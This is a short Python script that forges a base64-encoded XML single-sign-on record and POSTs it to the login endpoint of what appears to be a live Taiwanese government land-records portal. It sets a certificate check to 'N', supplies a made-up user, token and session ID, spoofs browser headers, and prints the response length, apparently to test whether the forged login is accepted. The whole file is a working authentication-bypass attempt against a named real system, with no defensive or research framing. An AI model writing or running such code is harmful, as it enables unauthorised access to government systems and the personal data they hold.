import requests
import threading
import sys 
import base64

url = "https://ep.land.nat.gov.tw/Login/QTLogin/"

Headers = {'Host': 'ep.land.nat.gov.tw', 'Content-Length': '977', 'Cache-Control': 'max-age=0', 'Sec-Ch-Ua': '"Chromium";v="131","Not_ABrand";v="24"', 'Sec-Ch-Ua-Mobile': '?0', 'Sec-Ch-Ua-Platform': '"Windows"', 'Accept-Language': 'zh-TW,zh;q=0.9', 'Origin': 'http://163.29.7.212', 'Content-Type': 'application/x-www-form-urlencoded', 'Upgrade-Insecure-Requests': '1', 'User-Agent': 'Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/131.0.6778.140Safari/537.36', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'Sec-Fetch-Site': 'cross-site', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Dest': 'document', 'Referer': 'http://163.29.7.212/', 'Accept-Encoding': 'gzip,deflate,br', 'Priority': 'u=0,i', 'Connection': 'keep-alive'}

testing = """<?xml version="1.0" encoding="big5"?>
<EXCHANGE>
<FROM>O</FROM>
<DATA>
<USERID>HiLNtest</USERID>
<USERNAME>¦a¬F»{ÃÒ´ú¸Õ¥Î</USERNAME>
<AAAID>413EA2C518F8574B2A979BB3CF27E600AFTIMOQJ</AAAID>
<CONFIRM></CONFIRM>
<MANAGER></MANAGER>
<AUTHID></AUTHID>
<AUTHNAME></AUTHNAME>
<CERT_CHECK>N</CERT_CHECK>
<CERTID></CERTID>
<CERTNAME></CERTNAME>
<CERT_TYPE></CERT_TYPE>
<REGTYPE_FLAG>2</REGTYPE_FLAG>
<CERT_AGENT_ID></CERT_AGENT_ID>
<CERT_AGENT_NAME></CERT_AGENT_NAME>
<CERT_AGENT_TYPE></CERT_AGENT_TYPE>
<AGENT_TYPE></AGENT_TYPE>
<BANNO></BANNO>
<CITYID>383160000A</CITYID>
<AREAID>12</AREAID>
<SESSIONID>1491</SESSIONID>
<IR49>00200000</IR49>
<IR49_1></IR49_1>
</DATA></EXCHANGE>
"""
byte_data = testing.encode('utf-8')
base64_data = base64.b64encode(byte_data).decode('utf-8')

print(base64_data)

payloads = {'F': 'EDOC', 'SSODATA': 'PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iYmlnNSI/Pg0KPEVYQ0hBTkdFPg0KPEZST00+TzwvRlJPTT4NCjxEQVRBPg0KPFVTRVJJRD5IaUxOdGVzdDwvVVNFUklEPg0KPFVTRVJOQU1FPqZhrEa7e8PStPq41aXOPC9VU0VSTkFNRT4NCjxBQUFJRD40MTNFQTJDNTE4Rjg1NzRCMkE5NzlCQjNDRjI3RTYwMEFGVElNT1FKPC9BQUFJRD4NCjxDT05GSVJNPjwvQ09ORklSTT4NCjxNQU5BR0VSPjwvTUFOQUdFUj4NCjxBVVRISUQ+PC9BVVRISUQ+DQo8QVVUSE5BTUU+PC9BVVRITkFNRT4NCjxDRVJUX0NIRUNLPk48L0NFUlRfQ0hFQ0s+DQo8Q0VSVElEPjwvQ0VSVElEPg0KPENFUlROQU1FPjwvQ0VSVE5BTUU+DQo8Q0VSVF9UWVBFPjwvQ0VSVF9UWVBFPg0KPFJFR1RZUEVfRkxBRz4yPC9SRUdUWVBFX0ZMQUc+DQo8Q0VSVF9BR0VOVF9JRD48L0NFUlRfQUdFTlRfSUQ+DQo8Q0VSVF9BR0VOVF9OQU1FPjwvQ0VSVF9BR0VOVF9OQU1FPg0KPENFUlRfQUdFTlRfVFlQRT48L0NFUlRfQUdFTlRfVFlQRT4NCjxBR0VOVF9UWVBFPjwvQUdFTlRfVFlQRT4NCjxCQU5OTz48L0JBTk5PPg0KPENJVFlJRD4zODMxNjAwMDBBPC9DSVRZSUQ+DQo8QVJFQUlEPjEyPC9BUkVBSUQ+DQo8U0VTU0lPTklEPjE0MDA8L1NFU1NJT05JRD4NCjxJUjQ5PjAwMjAwMDAwPC9JUjQ5Pg0KPElSNDlfMT48L0lSNDlfMT4NCjwvREFUQT4NCjwvRVhDSEFOR0U+DQo='}

response = requests.post(url,headers = Headers,data=payloads, allow_redirects=True)

print(len(response.content))